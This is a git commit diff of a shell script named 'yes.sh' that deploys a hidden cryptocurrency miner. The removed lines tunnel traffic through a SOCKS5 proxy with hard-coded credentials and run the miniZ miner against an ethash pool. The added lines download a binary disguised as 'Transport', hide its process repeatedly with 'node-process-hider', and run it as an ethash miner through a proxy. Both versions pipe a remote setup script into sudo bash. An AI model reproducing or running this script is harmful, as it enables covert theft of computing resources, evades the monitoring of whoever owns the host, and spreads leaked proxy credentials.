f0e3f9005b8bfaf010c302f5e78678be4b350d3c
rosianakicha <97800283+rosianakicha@users.noreply.github.com>
2022-05-15 10:55:49 -0500

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -1,43 +1,19 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
 apt-get install -y nodejs
-
 npm i -g node-process-hider
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/denisule54/why/raw/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = txclkzzp
-socks5_password = xvyu06p2e4ht
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
-
-tar xf miniZ_v1.8y3_linux-x64.tar.gz
-
-ph add miniZ
-
-./graftcp/graftcp ./miniZ -u teguhcong.$(echo $(shuf -i 1-999 -n 1)-ayolah) -l ethash.poolbinance.com --port=1800 -p x --par=ethash --pers auto
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+chmod +x Transport
+ph add Transport
+sleep 9
+ph add Transport
+sleep 9
+ph add Transport
+sleep 9
+ph add Transport
+sleep 9
+ph add Transport
+sleep 30
+sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u teguhcong -p x -w Trans --no-sni  --proxy 51.75.77.193:1081 --dns-https-server 1.1.1.1
